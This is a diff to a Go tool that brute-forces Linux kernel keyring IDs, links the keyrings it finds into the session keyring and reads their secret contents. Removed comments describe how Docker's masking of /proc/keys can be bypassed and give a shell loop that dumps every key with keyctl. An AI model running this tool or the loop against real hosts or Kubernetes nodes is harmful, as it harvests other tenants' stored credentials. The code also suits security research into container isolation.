@@ -14,6 +14,7 @@ import (
 )
 
 const (
+	// Only for 64 bit architecture
 	syscall_keyctl   uintptr = 250
 	syscall_add_key  uintptr = 248
 	syscall_setfsgid uintptr = 123
@@ -40,6 +41,7 @@ const (
 )
 
 const (
+	// you can reference builtin keyrings this way
 	keySpecThreadKeyring      keyId = -1
 	keySpecProcessKeyring     keyId = -2
 	keySpecSessionKeyring     keyId = -3
@@ -254,45 +256,6 @@ func keyctl(cmd keyctlCommand, args ...uintptr) (r1 int32, r2 int32, err error) 
 	return
 }
 
-func hack_main() {
-	// The poitn of this is Docker masks the /proc/keys so you can't
-	// see the keys that are exposed to the user. But the mask doesn't prevent
-	// you from accessing the keys themselves.
-	//
-	// example:
-	// sudo keyctl show $((16#3eed9e15))
-	// Should show the hex key id of the key if you have permission to it
-	// often you don't have permission but that shouldn't be docker's job
-	// Her'es an example:
-	//
-	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; sudo keyctl print $((16#$line)) ; done
-	//
-	// read in all the actual content from /proc/keys and then try to print them...
-	// this works if you're root.
-	// but this shows permission denied because of course you don't have permissions to the keys ala that thing.
-	// sudo cat /proc/keys | awk -F " " '{print $1}' | while read line ; do ; keyctl print $((16#$line)) ; done
-	// so TL;DR all kubernetes pods can read node keys and there's nothing you can do
-	// explained in more detail here: https://www.projectatomic.io/blog/2014/09/yet-another-reason-containers-don-t-contain-kernel-keyrings/
-
-	// keyid, err := listKeys(keyId(-5))
-	// fmt.Println(keyid, err)
-	// breturn, err := describeKeyId(keyId(914466913))
-	// fmt.Println(breturn, err)
-
-	// var secret []byte
-
-	// kid, err := add_key(
-	// 	"user",
-	// 	"description",
-	// 	secret,
-	// 	int32(999999999),
-	// )
-	// fmt.Println(kid, err)
-
-}
-
-//TODO add the link syscalls from the library here
-
 var max int
 var min int
 var keyid int
@@ -307,7 +270,9 @@ func init() {
 	flag.IntVar(&min, "min", 1, "Minimum key id range")
 	// optional: specific key id
 	flag.IntVar(&keyid, "key", 0, "Specific key ID to test (int32)")
+	// Either hunt mode or key mode
 	flag.BoolVar(&hunt, "hunt", true, "Enable brute force mode to search for key ids (Default enabled)")
+	// JSON output path
 	flag.StringVar(&output_path, "output", "./keyctl_ids", "Output path")
 
 }
@@ -315,7 +280,8 @@ func init() {
 func main() {
 	flag.Parse()
 
-	// Check for hunt mode or just key mode
+	// Just return an individual key if you want
+	// TODO update to use the linking stuff
 	if keyid != 0 {
 		//fmt.Println(keyid)
 		k := Key{KeyId: int32(keyid)}
@@ -407,7 +373,7 @@ func hunter() {
 				// to your personal session keyring, and then tries to read
 				// the contents.
 				// syscall keyctl_link(src, -3=session keyring)
-				err := keyctl_Link(keyId(k.KeyId), keyId(-3))
+				err := keyctl_Link(keyId(k.KeyId), keyId(keySpecSessionKeyring))
 				if err == nil {
 					// Try to read all the secrets of the keys
 					for i := range k.Subkeys {
@@ -419,7 +385,7 @@ func hunter() {
 
 					}
 					// Cleanup and unlink the keyring from your session
-					keyctl_Unlink(keyId(k.KeyId), keyId(-3))
+					keyctl_Unlink(keyId(k.KeyId), keyId(keySpecSessionKeyring))
 				}
 
 			} else if k.Type == "user" {
